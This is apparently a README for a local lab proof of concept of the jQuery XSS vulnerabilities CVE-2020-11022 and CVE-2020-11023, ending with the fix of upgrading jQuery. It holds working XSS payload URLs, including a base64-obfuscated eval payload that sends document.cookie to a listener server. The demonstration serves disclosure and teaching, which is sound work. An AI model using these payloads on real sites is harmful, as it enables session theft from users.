# CVE-2020-11022 CVE-2020-11023

> In jQuery versions greater than or equal to 1.2 and before 3.5.0, passing HTML from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. .html(), .append(), and others) may execute untrusted code. This problem is patched in jQuery 3.5.0.

> In jQuery versions greater than or equal to 1.0.3 and before 3.5.0, passing HTML containing <option> elements from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. .html(), .append(), and others) may execute untrusted code. This problem is patched in jQuery 3.5.0.

#### Exploit 

1. Host the index.php page on a PHP webserver. I suggest using `sudo php -S 127.0.0.1:80` to spin up a quick server. 

#### Simple XSS 

2. Visit the path [http://127.0.0.1/?value=/%3E%3Cimg%20src=x%20onerror=alert(1)%3E](http://127.0.0.1/?value=/%3E%3Cimg%20src=x%20onerror=alert(1)%3E)
3. Press the "Append via .html()" button. 
4. See the alert pop.

![image](https://github.com/0xAJ2K/CVE-2020-11022-CVE-2020-11023/raw/main/xss.png)

#### Cookie stealing 

2. Start another webserver on port 8085, I suggest using Python for this `sudo python3 -m http.server 8085`
3. Visit the path [http://127.0.0.1/?value=/%3E%3Cimg%20src=x%20onerror=eval(atob(%27ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly8xMjcuMC4wLjE6ODA4NS8/Yz0iK2RvY3VtZW50LmNvb2tpZQ==%27))%3E](http://127.0.0.1/?value=/%3E%3Cimg%20src=x%20onerror=eval(atob(%27ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly8xMjcuMC4wLjE6ODA4NS8/Yz0iK2RvY3VtZW50LmNvb2tpZQ==%27))%3E)
4. Press the "Append via .html()" button. 
5. Check the Python logs and see your cookie in the log. 

![image](https://github.com/0xAJ2K/CVE-2020-11022-CVE-2020-11023/raw/main/cookie.png)

#### Fix

If you'd like to fix this CVE in this script then just change the jQuery version to <https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.js> :)
